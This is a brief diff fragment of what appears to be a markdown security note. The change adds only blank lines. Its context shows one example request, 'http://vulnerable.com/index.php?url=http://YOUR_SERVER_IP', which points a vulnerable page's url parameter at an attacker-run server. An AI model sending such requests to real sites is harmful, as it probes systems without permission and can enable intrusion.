@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:12.441111+00:00'
 ```bash
 http://vulnerable.com/index.php?url=http://YOUR_SERVER_IP
 ```
+
+
